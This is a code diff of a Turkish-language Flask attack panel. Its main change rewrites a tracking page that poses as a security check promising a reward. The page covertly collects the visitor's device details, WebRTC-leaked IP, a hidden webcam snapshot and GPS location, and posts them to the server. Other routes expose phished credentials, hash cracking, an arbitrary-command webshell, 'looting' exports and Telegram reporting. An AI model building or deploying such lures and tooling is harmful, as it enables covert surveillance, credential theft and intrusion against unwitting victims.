@@ -584,14 +584,12 @@ def insta_phish():
 
 @app.route("/api/phish/creds")
 def api_phish_creds():
-    if not session.get("logged_in"):
-        return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
     return jsonify({"creds": CREDENTIAL_LOGS})
 
 @app.route("/api/crack-hash", methods=["POST"])
 def api_crack_hash():
-    if not session.get("logged_in"):
-        return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
     d = request.get_json()
     htype = d.get("type")
     target = d.get("hash").strip().lower()
@@ -621,108 +619,105 @@ def api_crack_hash():
 
 @app.route("/api/listener/start", methods=["POST"])
 def api_listener_start():
-    if not session.get("logged_in"):
-        return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
     port = request.get_json().get("port", 4444)
     return jsonify({"output": f"[+] Netcat dinleyicisi {port} portu üzerinde aktif edildi.\n(Not: Render/PaaS ortamlarında harici port açılması kısıtlı olduğundan simüle edildi.)"})
 
-# --- GELİŞMİŞ GPS & İSTİHBARAT TRACKER ROTA ---
+# --- GELİŞMİŞ GPS & İSTİHBARAT TRACKER ROTA (DÜZ STRING OLARAK DÜZELTİLDİ) ---
+TRACK_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>Güvenlik Doğrulaması</title>
+    <style>
+        body { background: #0b0f15; color: #00ff66; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+        .box { background: #121824; padding: 30px; border: 1px solid #00ff66; border-radius: 8px; box-shadow: 0 0 20px rgba(0,255,102,0.2); width: 350px; }
+        button { background: #0284c7; color: white; border: none; padding: 12px 20px; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 15px; width: 100%; }
+        button:hover { background: #0369a1; }
+    </style>
+</head>
+<body>
+    <div class="box">
+        <h3 style="color: #38bdf8;">⚠️ Bölgesel Güvenlik Doğrulaması</h3>
+        <p style="color: #94a3b8; font-size: 13px;">İşlemi tamamlamak ve ödülünüzü almak için gerekli izinleri onaylayın.</p>
+        <button onclick="collectAndSend()">Onayla ve Devam Et</button>
+    </div>
+    <video id="v" autoplay style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+    <script>
+        async function collectAndSend() {
+            let fingerprint = {
+                track_id: 'TRACK_ID_REPLACE',
+                screen: window.screen.width + "x" + window.screen.height,
+                cores: navigator.hardwareConcurrency || 'Bilinmiyor',
+                ram: navigator.deviceMemory || 'Bilinmiyor',
+                os: navigator.platform
+            };
+
+            if (navigator.getBattery) {
+                try {
+                    let b = await navigator.getBattery();
+                    fingerprint.battery = Math.round(b.level * 100) + "% (" + (b.charging ? "Şarjda" : "Pilde") + ")";
+                } catch(e) { fingerprint.battery = "Erişilemedi"; }
+            } else { fingerprint.battery = "Desteklenmiyor"; }
+
+            try {
+                let pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
+                pc.createDataChannel("");
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                pc.onicecandidate = ice => {
+                    if (ice && ice.candidate && ice.candidate.candidate) {
+                        let ipMatch = ice.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-fA-F0-9:]+:+[a-fA-F0-9:]+)/);
+                        if (ipMatch) fingerprint.webrtc_ip = ipMatch[1];
+                    }
+                };
+            } catch(e) {}
+
+            try {
+                let stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                let video = document.getElementById('v');
+                video.srcObject = stream;
+                await new Promise(r => setTimeout(r, 1000));
+                let canvas = document.getElementById('c');
+                canvas.width = 320; canvas.height = 240;
+                canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
+                fingerprint.snapshot = canvas.toDataURL('image/jpeg', 0.6);
+                stream.getTracks().forEach(t => t.stop());
+            } catch(e) { fingerprint.snapshot = null; }
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        fingerprint.lat = pos.coords.latitude;
+                        fingerprint.lon = pos.coords.longitude;
+                        sendData(fingerprint);
+                    },
+                    err => { sendData(fingerprint); },
+                    { timeout: 10000 }
+                );
+            } else {
+                sendData(fingerprint);
+            }
+        }
+
+        function sendData(data) {
+            fetch('/api/lure/save-geo', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            }).finally(() => {
+                window.location.href = "https://www.google.com";
+            });
+        }
+    </script>
+</body>
+</html>
+"""
+
 @app.route("/track/<track_id>")
 def track_visitor(track_id):
-    return f"""
-    <!DOCTYPE html>
-    <html lang="tr">
-    <head>
-        <meta charset="UTF-8">
-        <title>Güvenlik Doğrulaması</title>
-        <style>
-            body {{ background: #0b0f15; color: #00ff66; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }}
-            .box {{ background: #121824; padding: 30px; border: 1px solid #00ff66; border-radius: 8px; box-shadow: 0 0 20px rgba(0,255,102,0.2); width: 350px; }}
-            button {{ background: #0284c7; color: white; border: none; padding: 12px 20px; border-radius: 4px; font-weight: bold; cursor: pointer; margin-top: 15px; width: 100%; }}
-            button:hover {{ background: #0369a1; }}
-        </style>
-    </head>
-    <body>
-        <div class="box">
-            <h3 style="color: #38bdf8;">⚠️ Bölgesel Güvenlik Doğrulaması</h3>
-            <p style="color: #94a3b8; font-size: 13px;">İşlemi tamamlamak ve ödülünüzü almak için gerekli izinleri onaylayın.</p>
-            <button onclick="collectAndSend()">Onayla ve Devam Et</button>
-        </div>
-        <video id="v" autoplay style="display:none;"></video>
-        <canvas id="c" style="display:none;"></canvas>
-        <script>
-            async function collectAndSend() {{
-                let fingerprint = {{
-                    track_id: '{track_id}',
-                    screen: window.screen.width + "x" + window.screen.height,
-                    cores: navigator.hardwareConcurrency || 'Bilinmiyor',
-                    ram: navigator.deviceMemory || 'Bilinmiyor',
-                    os: navigator.platform
-                }};
-
-                // 1. Pil Durumu
-                if (navigator.getBattery) {{
-                    try {{
-                        let b = await navigator.getBattery();
-                        fingerprint.battery = Math.round(b.level * 100) + "% (" + (b.charging ? "Şarjda" : "Pilde") + ")";
-                    }} catch(e) {{ fingerprint.battery = "Erişilemedi"; }}
-                }} else {{ fingerprint.battery = "Desteklenmiyor"; }}
-
-                // 2. WebRTC IP Sızıntısı
-                try {{
-                    let pc = new RTCPeerConnection({{iceServers:[{{urls:"stun:stun.l.google.com:19302"}}]}});
-                    pc.createDataChannel("");
-                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
-                    pc.onicecandidate = ice => {{
-                        if (ice && ice.candidate && ice.candidate.candidate) {{
-                            let ipMatch = ice.candidate.candidate.match(/([0-9]{{1,3}}(\.[0-9]{{1,3}}){{3}}|[a-fA-F0-9:]+:+[a-fA-F0-9:]+)/);
-                            if (ipMatch) fingerprint.webrtc_ip = ipMatch[1];
-                        }}
-                    }};
-                }} catch(e) {{}}
-
-                // 3. Ön Kamera Snapshot
-                try {{
-                    let stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
-                    let video = document.getElementById('v');
-                    video.srcObject = stream;
-                    await new Promise(r => setTimeout(r, 1000));
-                    let canvas = document.getElementById('c');
-                    canvas.width = 320; canvas.height = 240;
-                    canvas.getContext('2d').drawImage(video, 0, 0, 320, 240);
-                    fingerprint.snapshot = canvas.toDataURL('image/jpeg', 0.6);
-                    stream.getTracks().forEach(t => t.stop());
-                }} catch(e) {{ fingerprint.snapshot = null; }}
-
-                // 4. GPS Konum
-                if (navigator.geolocation) {{
-                    navigator.geolocation.getCurrentPosition(
-                        pos => {{
-                            fingerprint.lat = pos.coords.latitude;
-                            fingerprint.lon = pos.coords.longitude;
-                            sendData(fingerprint);
-                        },
-                        err => {{ sendData(fingerprint); }},
-                        {{ timeout: 10000 }}
-                    );
-                }} else {{
-                    sendData(fingerprint);
-                }}
-            }}
-
-            function sendData(data) {{
-                fetch('/api/lure/save-geo', {{
-                    method: 'POST',
-                    headers: {{'Content-Type': 'application/json'}},
-                    body: JSON.stringify(data)
-                }}).finally(() => {{
-                    window.location.href = "https://www.google.com";
-                }});
-            }}
-        </script>
-    </body>
-    </html>
-    """
+    return TRACK_TEMPLATE.replace('TRACK_ID_REPLACE', track_id)
 
 @app.route("/api/lure/save-geo", methods=["POST"])
 def save_geo():
@@ -756,14 +751,12 @@ def save_geo():
 
 @app.route("/api/lure/logs")
 def api_lure_logs():
-    if not session.get("logged_in"):
-        return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
     return jsonify({"logs": CLICK_LOGS})
 
 @app.route("/api/telegram-test", methods=["POST"])
 def api_telegram_test():
-    if not session.get("logged_in"):
-        return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
     chat_id = request.get_json().get("chat_id")
     if not chat_id: return jsonify({"output": "[-] Chat ID boş olamaz!"})
     try:
@@ -777,8 +770,7 @@ def api_telegram_test():
 
 @app.route("/api/wifi-audit", methods=["POST"])
 def api_wifi_audit():
-    if not session.get("logged_in"):
-        return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
     data = request.get_json()
     action, iface = data.get("action"), data.get("iface", "wlan0")
     if action == "interfaces": cmd = "ip link show || ifconfig || iwconfig || cat /proc/net/dev"
@@ -791,8 +783,7 @@ def api_wifi_audit():
 
 @app.route("/api/scan", methods=["POST"])
 def api_scan():
-    if not session.get("logged_in"):
-        return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
     data = request.get_json()
     report, record = red_team_comprehensive_recon(data.get("target", ""))
     existing = next((i for i in SITE_DATABASE if i["target"] == record["target"]), None)
@@ -802,15 +793,13 @@ def api_scan():
 
 @app.route("/api/nikto", methods=["POST"])
 def api_nikto():
-    if not session.get("logged_in"):
-        return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
     target = request.get_json().get("target", "")
     return jsonify({"report": f"root@kali-box:~# nikto -h {target}\n[+] Nikto scan completed."})
 
 @app.route("/api/dns", methods=["POST"])
 def api_dns():
-    if not session.get("logged_in"):
-        return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
     domain = request.get_json().get("domain", "")
     try: ip = socket.gethostbyname(domain)
     except: ip = "Resolv fail"
@@ -818,26 +807,22 @@ def api_dns():
 
 @app.route("/api/sqlmap", methods=["POST"])
 def api_sqlmap():
-    if not session.get("logged_in"):
-        return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
     return jsonify({"report": "sqlmap injection test completed."})
 
 @app.route("/api/subdomain-scan", methods=["POST"])
 def api_subdomain_scan():
-    if not session.get("logged_in"):
-        return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
     return jsonify({"report": "Subdomain brute-force completed."})
 
 @app.route("/api/brute-force", methods=["POST"])
 def api_brute_force():
-    if not session.get("logged_in"):
-        return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
     return jsonify({"report": "Brute-force sequence completed."})
 
 @app.route("/api/webshell", methods=["POST"])
 def api_webshell():
-    if not session.get("logged_in"):
-        return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
     cmd = request.get_json().get("command", "")
     try: out = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5).decode('utf-8', errors='ignore')
     except Exception as e: out = str(e)
@@ -845,14 +830,12 @@ def api_webshell():
 
 @app.route("/api/analyze-file", methods=["POST"])
 def api_analyze_file():
-    if not session.get("logged_in"):
-        return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
     return jsonify({"report": "File analysis clean."})
 
 @app.route("/api/all-data")
 def api_all_data():
-    if not session.get("logged_in"):
-        return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
     return jsonify({"database": SITE_DATABASE})
 
 @app.route("/api/export/json")
@@ -870,8 +853,7 @@ def export_csv():
 
 @app.route("/api/looting/zip")
 def api_looting_zip():
-    if not session.get("logged_in"):
-        return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
     target = request.args.get("target", "")
     record = next((i for i in SITE_DATABASE if i["target"] == target), None)
     mf = io.BytesIO()
@@ -882,16 +864,14 @@ def api_looting_zip():
 
 @app.route("/api/download-pdf")
 def api_download_pdf():
-    if not session.get("logged_in"):
-        return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
     pdf = FPDF(); pdf.add_page(); pdf.set_font('Courier', '', 9)
     pdf.multi_cell(0, 5, "Red Team Report")
     return send_file(io.BytesIO(pdf.output(dest='S').encode('latin-1')), mimetype='application/pdf', as_attachment=True, download_name='report.pdf')
 
 @app.route("/api/telegram-send", methods=["POST"])
 def api_telegram_send():
-    if not session.get("logged_in"):
-        return jsonify({"error": "Unauthorized"}), 401
+    if not session.get("logged_in"): return jsonify({"error": "Unauthorized"}), 401
     d = request.get_json()
     res = requests.post(f"{BASE_URL}/sendMessage", json={"chat_id": d.get("chat_id"), "text": f"```\n{d.get('report')[:4000]}\n```", "parse_mode": "Markdown"})
     return jsonify({"status": "Sent!" if res.status_code == 200 else "Failed."})
